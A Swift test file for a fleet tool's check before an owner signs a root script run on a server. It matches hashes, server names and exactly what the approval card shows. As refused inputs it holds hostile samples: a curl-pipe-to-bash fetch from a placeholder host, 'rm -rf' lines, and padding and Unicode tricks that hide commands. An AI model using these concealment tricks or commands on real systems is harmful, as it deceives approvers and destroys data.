import Foundation
import Testing
@testable import FleetCore

/// The hash of a door call on the owner's Mac, and the check of the door's card before the Mac signs Run it once
/// (review point 5.6 of 11 November 2026, API 1.125); and the body, the time and the receipt of a server's signed mode
/// (owner feature `door_mode_set`). Example names only.
struct DoorCallTests {
    /// The examples that the door and the Mac are both tested with. The definition is `test_door.CALL_HASHES` of the
    /// hub's tests, which fails when the lines between the two marks differ from its own: one JSON line for each,
    /// [target, action, arguments, content as text, hash].
    static let examples = #"""
        // call-hashes:begin
        ["web-1", "run", [], "id\n", "166f72a0e75ff9b58dd452f10cc9d93600ef1d33e15f1c38fe2071cafd688d70"]
        ["web-1", "run", [], "id", "6f32c97d1968a553afdbc5788ed7dee1c872feb1a740083e1ef11a1c44a22a23"]
        ["web-1", "run", [], "", "812f281547e30beda0ec6ce09ebcf4a10fe6859394d4390f1072b07d66973410"]
        ["db-1.example.internal", "run", [], "#!/bin/bash\nset -euo pipefail\nflock /run/lock/app.lock \\\n\tcp -a \"/srv/app/uploads\" /root/uploads-$(date +%F)\n", "195c09ac81728cad73a7a9f54af8c3939a2cb56f5b972300575279311b8c6d87"]
        ["web-1", "run", [], "echo 'caf\u00e9 \u00fc\u00f1 \u4e2d\u6587 \ud83d\ude00'\n", "cfd77784479f00274b0ad2154e69062aeaf395cd206386ee95ca593c96282161"]
        ["web-1", "restart", ["nginx"], "", "caef4b357ff328666c9390e2b13166e80ad10a97710c1fd8bb5fdcfc8b30b990"]
        ["hetzner:one", "server-delete", ["shop \"old\" \\ 1", "caf\u00e9", "\ud83d\ude00 \u007f"], "", "0428db94f078234bf77c8e1b7b416f01560359ff7573ade4db44ae96a2fb7cd8"]
        ["web-1", "file", ["/etc/app/a b.conf", "0644"], "key = \"value\"\n", "1ffa5dbd2fa34e5d48087a042d7dc3e5d0d292bf1119d39ecfee0f343e3da241"]
        // call-hashes:end
        """#

    @Test func theHashIsTheDoorsForEachExample() throws {
        let lines = Self.examples.split(separator: "\n").filter { !$0.hasPrefix("//") }
        #expect(lines.count >= 8)
        for line in lines {
            let fields = try #require(JSONSerialization.jsonObject(with: Data(line.utf8)) as? [Any])
            let target = try #require(fields[0] as? String), action = try #require(fields[1] as? String)
            let arguments = try #require(fields[2] as? [String]), content = try #require(fields[3] as? String)
            #expect(DoorCall.hash(target: target, action: action, arguments: arguments, content: Data(content.utf8))
                    == fields[4] as? String, "\(line)")
        }
    }

    /// Python's `json.dumps` with its defaults, which the door hashes: every unit outside space to tilde is \uxxxx.
    @Test func aTextIsWrittenAsPythonWritesIt() {
        #expect(DoorCall.text("web-1") == #""web-1""#)
        #expect(DoorCall.text("a\"b\\c") == #""a\"b\\c""#)
        #expect(DoorCall.text("\n\r\t\u{08}\u{0C}\u{01}\u{1F}\u{7F}") == #""\n\r\t\b\f\u0001\u001f\u007f""#)
        #expect(DoorCall.text("caf\u{E9} \u{4E2D} \u{1F600} \u{2028}") == #""caf\u00e9 \u4e2d \ud83d\ude00 \u2028""#)
        #expect(DoorCall.text("e\u{301}") == #""e\u0301""#)          // not the one letter that looks the same
        #expect(DoorCall.text("") == #""""#)
    }

    static let script = "#!/bin/bash\nset -e\ncp -a /srv/app/uploads /root/uploads-copy\n"
    static let call = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(script.utf8))

    static func checked(title: String = "Run one root script on web-1?",
                        answers: [String] = ["Run it once", "Full access on web-1", "No"], host: String = "web-1",
                        call: String = call, script: String? = script,
                        details: String? = "```\n" + script + "```") -> Result<String, DoorCall.Refusal> {
        DoorCall.checked(title: title, answers: answers, host: host, call: call, script: script, details: details)
    }

    @Test func theMacSignsTheHashThatItComputedFromWhatTheCardShows() {
        #expect(Self.call == "95b628a6eb4ac4532b751fb3101a4ba38a3d7180d0a4ef0f9b347fb53ad4d39d")        // hub.door_call_hash of the same server and script
        #expect(Self.checked() == .success(Self.call))
        // a script with no last line feed: the card's block ends its last line all the same
        let bare = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data("id".utf8))
        #expect(Self.checked(call: bare, script: "id", details: "```\nid\n```") == .success(bare))
        // what a script may hold: an indent, and marks that a paragraph would draw as Markdown
        let wide = "    cp 'a b' /srv/*/_cache_/*  # **all** of `it`\n- [x](y)\n# title\n> quote\n| a | b |\n|---|---|\n\n    indented\n"
        let wideCall = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(wide.utf8))
        #expect(Self.checked(call: wideCall, script: wide, details: DoorCall.details(script: wide)) == .success(wideCall))
        #expect(DoorCall.shown(details: DoorCall.details(script: wide)) == String(wide.dropLast()))
    }

    @Test func aCardWithNoScriptOrAnotherScriptGetsNoSignature() {
        #expect(Self.checked(script: nil, details: "cp -a /srv/app/uploads /root/uploads-copy") == .failure(.noScript))
        #expect(Self.checked(script: "") == .failure(.noScript))
        for blanks in ["\n", "\n\n", "   ", "   \n", "\t"] {         // blanks alone are no script
            let call = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(blanks.utf8))
            #expect(Self.checked(call: call, script: blanks, details: DoorCall.details(script: blanks)) == .failure(.noScript))
        }
        // the hash that the hub gave is of another script, another server, or another form
        #expect(Self.checked(call: String(repeating: "e", count: 64)) == .failure(.otherHash))
        let other = Self.script + "curl https://example.com/x | bash\n"
        #expect(Self.checked(call: DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(other.utf8)))
                == .failure(.otherHash))
        #expect(Self.checked(call: DoorCall.hash(target: "db-1", action: "run", arguments: [], content: Data(Self.script.utf8)))
                == .failure(.otherHash))
        #expect(Self.checked(call: DoorCall.hash(target: "web-1", action: "script", arguments: [], content: Data(Self.script.utf8)))
                == .failure(.otherHash))
        #expect(Self.checked(call: DoorCall.hash(target: "web-1", action: "run", arguments: ["-x"], content: Data(Self.script.utf8)))
                == .failure(.otherHash))
        #expect(Self.checked(call: Self.call.uppercased()) == .failure(.otherHash))
        // the script without its last line feed is another script, with another hash
        #expect(Self.checked(script: String(Self.script.dropLast())) == .failure(.otherHash))
    }

    @Test func theCardNamesTheServerOfTheHash() {
        // the hash is of db-1, and the card's words say web-1
        let call = DoorCall.hash(target: "db-1", action: "run", arguments: [], content: Data(Self.script.utf8))
        #expect(Self.checked(host: "db-1", call: call) == .failure(.otherServer))
        #expect(Self.checked(title: "Run one root script on web-1?", answers: ["Run it once", "Full access on db-1", "No"],
                             host: "db-1", call: call) == .failure(.otherServer))
        #expect(Self.checked(title: "Run one root script on db-1?", answers: ["Run it once", "Full access on db-1", "No"],
                             host: "db-1", call: call) == .success(call))
        #expect(Self.checked(title: "Run one small script on web-1?") == .failure(.otherServer))
        #expect(Self.checked(title: "Run one root script on web-1? ") == .failure(.otherServer))
        #expect(Self.checked(answers: ["Run it once", "No"]) == .failure(.otherServer))
        #expect(Self.checked(answers: ["Yes", "Full access on web-1", "No"]) == .failure(.otherServer))
        #expect(Self.checked(answers: ["Run it once", "Full access on web-1", "No", "Later"]) == .failure(.otherServer))
    }

    @Test func whatTheCardDrawsIsTheWholeScriptAndNothingElse() {
        let fenced = "```\n" + Self.script + "```"
        for details in [nil, Self.script, "It copies a folder.\n\n" + fenced, fenced + "\n\nIt is safe.",
                        fenced + "\n", " " + fenced, "```\nid\n```", "```sh\n" + Self.script + "```",
                        "```\n" + Self.script, "```\n" + Self.script + "```\n```\nrm -rf /\n```",
                        fenced.replacingOccurrences(of: "uploads-copy", with: "uploads-c\u{43E}py")] as [String?] {
            #expect(Self.checked(details: details) == .failure(.notShown), "\(details ?? "nil")")
        }
        // a line of the script that ends the card's block: the card would show the script to that line only
        for script in ["id\n```\nrm -rf /srv\n", "id\n  ```sh\nrm -rf /srv\n", "```\nid\n"] {
            let call = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(script.utf8))
            #expect(Self.checked(call: call, script: script, details: DoorCall.details(script: script)) == .failure(.notShown),
                    "\(script)")
        }
        // two spellings of one letter are one String to Swift and two texts to bash: the bytes decide
        let one = "caf\u{E9}", two = "cafe\u{301}"
        #expect(one == two && !DoorCall.same(one, two))
        #expect(Self.checked(title: "Run one root script on web-1?\u{200B}") == .failure(.otherServer))
    }

    /// A script is printable ASCII and line feeds. The reviews of 12 November 2026 ran each of these: the card drew one
    /// thing and bash ran another.
    @Test func aCharacterThatIsNotPlainTextGetsNoSignature() {
        for (text, code) in [("id\r\n", "U+000D"), ("echo a\u{202E}b\n", "U+202E"), ("echo a\u{200B}b\n", "U+200B"),
                             ("rm -rf /srv/app\u{A0}/\n", "U+00A0"), ("echo \u{1B}[2K\n", "U+001B"),
                             ("echo a\u{0}b\n", "U+0000"), ("echo \u{FEFF}\n", "U+FEFF"), ("a\u{2028}b\n", "U+2028"),
                             ("echo \u{E000}\n", "U+E000"), ("echo \u{E0041}\n", "U+E0041"), ("id \u{7F}\n", "U+007F"),
                             ("id\u{0B}\n", "U+000B"), ("id\u{85}\n", "U+0085"), ("id\u{3000}x\n", "U+3000"),
                             // a here-document that is none: the mark between the two signs draws nothing
                             ("cat > /root/howto.txt <\u{34F}<EOF\nrm -rf /srv/app/uploads\nEOF\n", "U+034F"),
                             ("echo nothing to do; exit\u{34F} 0\nrm -rf /srv/app/uploads\n", "U+034F"),
                             // a blank that is no space: the line reads as an indented comment
                             ("\u{2800}# note; rm -rf /srv/app\n", "U+2800"),
                             // a letter that reads as a quote, and a right-to-left letter that reorders the line
                             ("echo \u{2BC}done; rm -rf /srv/app\u{2BC}\n", "U+02BC"), ("mv /srv/\u{5D0} 1 2\n", "U+05D0"),
                             ("echo x\u{FE0F}\n", "U+FE0F"), ("echo \u{3164}\n", "U+3164"), ("echo \u{FFFC}\n", "U+FFFC"),
                             // a tab is drawn to a tab stop: after 50 letters as a new row, after 15 as no gap at all
                             ("x " + String(repeating: "x", count: 48) + "\tyyy\nz\n", "U+0009"),
                             (String(repeating: "x", count: 15) + "\tyyy\n", "U+0009"), ("if true; then\n\tid\nfi\n", "U+0009"),
                             ("echo caf\u{E9}\n", "U+00E9"), ("echo cafe\u{301}\n", "U+0301"), ("echo \u{1F600}\n", "U+1F600")] {
            #expect(DoorCall.hidden(in: text) == code)
            let call = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(text.utf8))
            #expect(Self.checked(call: call, script: text, details: DoorCall.details(script: text)) == .failure(.hidden(code)))
        }
        #expect(DoorCall.hidden(in: "  cp 'a b' x\n\n # ~!@$%^&*()_+{}|:\"<>?`-=[]\\;',./\n") == nil)
    }

    /// The card wraps a long line, so every character is on screen; a script that is padded with blanks would still
    /// put a command a screen away from the words before it.
    @Test func aPaddedOrLongScriptGetsNoSignature() {
        func result(_ script: String) -> Result<String, DoorCall.Refusal> {
            let call = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(script.utf8))
            return Self.checked(call: call, script: script, details: DoorCall.details(script: script))
        }
        let spaces = String(repeating: " ", count: 600)
        #expect(result("systemctl restart nginx" + spaces + "; curl -s https://example.com/x | bash\n") == .failure(.padded))
        #expect(result(spaces + "id\n") == .failure(.padded))
        #expect(result("id" + String(repeating: " ", count: 33) + "x\n") == .failure(.padded))
        #expect(result("id\n" + String(repeating: "\n", count: 3000) + "rm -rf /srv/app\n") == .failure(.padded))
        #expect(result("id\n\n\n\nrm -rf /srv/app\n") == .failure(.padded))                  // three blank lines
        #expect(result("id\n \n   \n  \nrm -rf /srv/app\n") == .failure(.padded))           // blank lines of spaces
        #expect(result("\n\n\nid\n") == .failure(.padded))
        #expect(result(String(repeating: "#", count: 4000) + "\n") == .failure(.padded))    // 4001 characters
        #expect(result(String(repeating: "# a comment line\n", count: 12_001)) == .failure(.padded))
        #expect(result("id\n" + String(repeating: "#\n", count: 200)) == .failure(.padded))        // 201 lines
        #expect(result(String(repeating: "x\n\n\n", count: 1000)) == .failure(.padded))
        // what stays: two blank lines, an indent, a gap of 32 spaces, a long line with no gap, 4000 characters, 200 lines
        for ok in ["id\n\n\nrm -rf /srv/app/cache\n", "if true; then\n        id\nfi\n",
                   "id" + String(repeating: " ", count: 32) + "# why\n", "echo " + String(repeating: "x", count: 900) + "\n",
                   String(repeating: "#", count: 3999) + "\n", "id\n\n", String(repeating: "id\n", count: 200),
                   String(repeating: "id\n", count: 199) + "id"] {
            let call = DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(ok.utf8))
            #expect(result(ok) == .success(call), "\(ok.prefix(40))")
        }
        #expect(DoorCall.padded("id" + String(repeating: " ", count: 33) + "x") && !DoorCall.padded("a        b"))
    }

    /// The card's own words are drawn as Markdown, above the script: a code block there would read as the script.
    @Test func codeInTheCardsOwnWordsGetsNoSignature() {
        let decoy = "It restarts the web server, nothing else:\n```\nsystemctl restart nginx\n```"
        func result(_ words: [String]) -> Result<String, DoorCall.Refusal> {
            DoorCall.checked(title: DoorCall.title(host: "web-1"), answers: DoorCall.answers(host: "web-1"), host: "web-1",
                             call: Self.call, script: Self.script, details: DoorCall.details(script: Self.script), words: words)
        }
        #expect(result([decoy, "Answer"]) == .failure(.decoy))
        #expect(result(["It copies a folder.", "Run `id` first"]) == .failure(.decoy))
        #expect(result(["It copies the uploads folder of its app.", "Answer Run it once, or Full access on web-1"])
                == .success(Self.call))
    }

    /// A server's name is the door's: a name with another letter can look like another server.
    @Test func theServerIsAPlainName() {
        for host in ["web-1", "db-1.example.internal", "9a", "a"] { #expect(DoorCall.isHost(host), "\(host)") }
        for host in ["", "w\u{435}b-1", "web-1\n", "Web-1", "web 1", "web_1", "-web-1", ".", "db-1\u{202E}1-bew",
                     "web-1? (and db-1", String(repeating: "a", count: 64)] {
            #expect(!DoorCall.isHost(host), "\(host)")
            let call = DoorCall.hash(target: host, action: "run", arguments: [], content: Data(Self.script.utf8))
            #expect(Self.checked(title: DoorCall.title(host: host), answers: DoorCall.answers(host: host), host: host,
                                 call: call) == .failure(.otherServer))
        }
        // Full access is signed on the door's own card of that server only
        #expect(DoorCall.names(host: "db-1", title: "Run one root script on db-1?", answers: DoorCall.answers(host: "db-1")))
        #expect(!DoorCall.names(host: "db-1", title: "Which report format?", answers: ["PDF", "Spreadsheet", "Neither"]))
        #expect(!DoorCall.names(host: "db-1", title: "Run one root script on web-1?", answers: DoorCall.answers(host: "web-1")))
        #expect(!DoorCall.names(host: "db-1", title: "Run one root script on db-1?", answers: ["Run it once", "Full access on db-1"]))
    }

    /// A press that waited for the store is sent for the card that he pressed on, and for no other.
    @Test func aCardThatChangedIsAnotherCard() throws {
        func need(_ more: [String: Any] = [:]) throws -> OwnerNeed {
            var row: [String: Any] = ["id": 7, "title": DoorCall.title(host: "web-1"), "why": "It copies a folder.",
                                      "todo": "Answer", "raised": 1.0, "by": "manager",
                                      "options": DoorCall.answers(host: "web-1"), "door_call": Self.call,
                                      "door_host": "web-1", "door_script": Self.script,
                                      "details": DoorCall.details(script: Self.script)]
            row.merge(more) { $1 }
            return try JSONDecoder().decode(OwnerNeed.self, from: JSONSerialization.data(withJSONObject: row))
        }
        let pressed = try need()
        #expect(pressed.signsTheSame(as: try need()))
        let later = "curl -s https://example.com/x | bash\n"
        for change in [["door_script": later, "details": DoorCall.details(script: later),
                        "door_call": DoorCall.hash(target: "web-1", action: "run", arguments: [], content: Data(later.utf8))],
                       ["door_call": String(repeating: "e", count: 64)], ["door_host": "db-1"], ["why": "It is safe."],
                       ["title": DoorCall.title(host: "db-1")], ["todo": "Press the first one"], ["id": 8],
                       ["github_app": "example-org"], ["add_device": 1],
                       ["options": ["Run it once", "Full access on db-1", "No"]], ["details": NSNull()],
                       ["door_script": NSNull()]] as [[String: Any]] {
            #expect(!pressed.signsTheSame(as: try need(change)), "\(change.keys)")
        }
    }

    @Test func eachRefusalIsOneLineThatNamesWhoToAsk() {
        for refusal in [DoorCall.Refusal.noScript, .otherServer, .hidden("U+202E"), .padded, .decoy, .notShown, .otherHash] {
            let line = refusal.line(by: "DevOps Manager")
            #expect(!line.contains("\n") && line.hasSuffix("Ask DevOps Manager for a new card.") && line.count < 200)
        }
    }

    /// A hub from before API 1.125 sends no script: the line names the hub, not the agent, as what must change.
    @Test func anOlderHubIsNamedAsWhatMustChange() {
        #expect(!DoorCall.olderHub.contains("\n") && DoorCall.olderHub.hasSuffix("Update the hub.") && DoorCall.olderHub.count < 200)
    }

    @Test func anItemCarriesItsScript() throws {
        func need(_ more: [String: Any]) throws -> OwnerNeed {
            var row: [String: Any] = ["id": 7, "title": DoorCall.title(host: "web-1"), "why": "It copies a folder.",
                                      "todo": "Answer", "raised": 1.0, "by": "manager",
                                      "options": DoorCall.answers(host: "web-1"), "door_call": Self.call,
                                      "door_host": "web-1"]
            row.merge(more) { $1 }
            return try JSONDecoder().decode(OwnerNeed.self, from: JSONSerialization.data(withJSONObject: row))
        }
        let card = try need(["door_script": Self.script, "details": DoorCall.details(script: Self.script)])
        #expect(card.door_script == Self.script)
        #expect(DoorCall.checked(title: card.title, answers: card.options ?? [], host: "web-1", call: Self.call,
                                 script: card.door_script, details: card.details) == .success(Self.call))
        let old = try need(["details": "cp -a /srv/app/uploads /root/uploads-copy"])      // a hub before API 1.125
        #expect(old.door_script == nil)
        #expect(DoorCall.checked(title: old.title, answers: old.options ?? [], host: "web-1", call: Self.call,
                                 script: old.door_script, details: old.details) == .failure(.noScript))
    }

    // MARK: a server's mode

    /// The owner's mode of one server, Auto as Full access, byte for byte as the door's check reads it
    /// (`door.mode_statement`, with the central vault's `canonical`).
    @Test func aModeStatementOfAutoIsTheJSONThatTheDoorChecks() {
        #expect(OwnerStatement.doorMode(fleet: "0f1e2d3c4b5a6978", host: "web-1", mode: DoorMode.auto.rawValue, at: 1_761_300_009)
                == #"{"at":1761300009,"fleet":"0f1e2d3c4b5a6978","host":"web-1","kind":"door-mode","mode":"auto","v":1}"#)
        #expect(DoorMode.allCases.map(\.rawValue) == ["auto", "full"])
    }

    /// The door takes only a statement that is newer than the one it keeps, so the next one is later than the newest
    /// that the hub carries, and never further ahead than the door takes.
    @Test func theNextStatementIsLaterThanTheNewest() {
        #expect(DoorModeCommand.time(now: 1_000, after: nil) == 1_000)
        #expect(DoorModeCommand.time(now: 1_000, after: 900) == 1_000)
        #expect(DoorModeCommand.time(now: 1_000, after: 1_000) == 1_001)           // two changes in one second
        #expect(DoorModeCommand.time(now: 1_000, after: 1_200) == 1_201)           // a clock a little behind
        #expect(DoorModeCommand.time(now: 1_000, after: 1_299) == 1_300)
        #expect(DoorModeCommand.time(now: 1_000, after: 1_300) == nil)             // too far behind: the door would refuse it
        #expect(DoorModeCommand.time(now: 1_000, after: Int.max) == nil)           // a time that no clock has
        #expect(DoorModeCommand.time(now: 1_000, after: Int.min) == 1_000)
    }

    @Test func theBodyIsTheStatementItsSignatureAndTheServer() throws {
        let id = try #require(UUID(uuidString: "0A0B0C0D-1111-4222-8333-444455556666"))
        let statement = OwnerStatement.doorMode(fleet: "0f1e2d3c4b5a6978", host: "web-1", mode: "auto", at: 1_761_300_009)
        let signature = Data(repeating: 0x30, count: 70).base64EncodedString()
        let body = try DoorModeCommand.body(requestID: id, database: "gen-1", host: "web-1", statement: statement,
                                            signature: signature)
        let sent = try #require(JSONSerialization.jsonObject(with: body) as? [String: String])
        #expect(sent == ["request_id": "0a0b0c0d-1111-4222-8333-444455556666", "db": "gen-1", "host": "web-1",
                         "statement": statement, "signature": signature])
        for host in ["", "Web-1", "web 1", "web_1", "-web-1", ".", String(repeating: "a", count: 64)] {
            #expect(throws: HubError.self) {
                try DoorModeCommand.body(requestID: id, database: "gen-1", host: host, statement: statement, signature: signature)
            }
        }
        #expect(throws: HubError.self) {
            try DoorModeCommand.body(requestID: id, database: "gen-1", host: "web-1", statement: statement, signature: "no")
        }
        #expect(throws: HubError.self) {
            try DoorModeCommand.body(requestID: id, database: "gen-1", host: "web-1", statement: "", signature: signature)
        }
    }

    @Test func theHubsNewerStatementAndItsReceipt() throws {
        let said = Data(#"{"error": "the hub carries a mode of web-1 that is as new", "at": 1761300009}"#.utf8)
        #expect(DoorModeCommand.newer(status: 409, body: said)
                == DoorModeCommand.Newer(at: 1_761_300_009, words: "the hub carries a mode of web-1 that is as new"))
        #expect(DoorModeCommand.newer(status: 400, body: said) == nil)
        #expect(DoorModeCommand.newer(status: 409, body: Data(#"{"error": "x", "at": 9007199254740993}"#.utf8))?.at
                == 9_007_199_254_740_993)
        for other in [#"{"error": "no agent holds web-1 at Fix"}"#, #"{"error": "x", "at": true}"#,
                      #"{"error": "x", "at": 1.5}"#, #"{"error": "x", "at": "5"}"#, "[]", ""] {
            #expect(DoorModeCommand.newer(status: 409, body: Data(other.utf8)) == nil, "\(other)")
        }
        let id = try #require(UUID(uuidString: "0A0B0C0D-1111-4222-8333-444455556666"))
        func receipt(_ more: String) -> Data {
            Data(#"{"ok": true, "request_id": "0a0b0c0d-1111-4222-8333-444455556666", "client": "mac-1", "replayed": false, \#(more)}"#.utf8)
        }
        let good = try DoorModeCommand.receipt(receipt(#""host": "web-1", "mode": "auto", "at": 9, "changed": true"#),
                                               requestID: id, client: "mac-1", host: "web-1", mode: .auto, at: 9)
        #expect(good.changed && good.mode == "auto")
        for wrong in [#""host": "db-1", "mode": "auto", "at": 9, "changed": true"#,
                      #""host": "web-1", "mode": "full", "at": 9, "changed": true"#,
                      #""host": "web-1", "mode": "auto", "at": 8, "changed": true"#,
                      #""host": "web-1", "mode": "auto", "at": 9"#] {
            #expect(throws: (any Error).self) {
                try DoorModeCommand.receipt(receipt(wrong), requestID: id, client: "mac-1", host: "web-1", mode: .auto, at: 9)
            }
        }
    }
}
